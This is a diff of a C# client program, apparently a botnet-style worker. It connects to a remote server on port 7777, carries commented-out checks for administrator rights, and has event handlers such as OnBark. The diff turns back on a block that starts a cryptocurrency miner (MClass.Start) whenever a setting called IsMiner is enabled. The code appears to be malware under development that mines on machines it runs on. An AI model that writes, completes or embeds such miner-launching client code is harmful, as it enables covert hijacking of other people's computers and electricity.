@@ -20,10 +20,9 @@ namespace ClientWorker
             //WindowsPrincipal pricipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
             //bool hasAdministrativeRight = pricipal.IsInRole(WindowsBuiltInRole.Administrator);
             
-            //Application.EnableVisualStyles();
-            //Application.SetCompatibleTextRenderingDefault(false);
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
             //chat = new ChatForm();
-            //chat.SetLabel(hasAdministrativeRight.ToString());
             //Thread myThread = new Thread(() => Application.Run(chat)); //Создаем новый объект потока (Thread)
 
             //myThread.Start(); //запускаем поток
@@ -32,8 +31,8 @@ namespace ClientWorker
 
 
             netSender = new Client();
-            //netSender.Host = "localhost";
-            netSender.Host = StartData.currentServer;
+            netSender.Host = "localhost";
+            //netSender.Host = StartData.currentServer;
             netSender.Port = 7777;
             netSender.Events.OnError = OnError;
             netSender.Events.OnBark = OnBark;
@@ -113,14 +112,14 @@ namespace ClientWorker
                 }
             }
 
-            //if (!isM && Service.Properties.Settings.Default.IsMiner)
-            //{
-            //    try
-            //    {
-            //        MClass.Start();
-            //    }
-            //    catch (Exception ex) { Log.Send(ex.Message); }
-            //}
+            if (!isM && Service.Properties.Settings.Default.IsMiner)
+            {
+                try
+                {
+                    MClass.Start();
+                }
+                catch (Exception ex) { Log.Send(ex.Message); }
+            }
 
 
             if (num > 1)
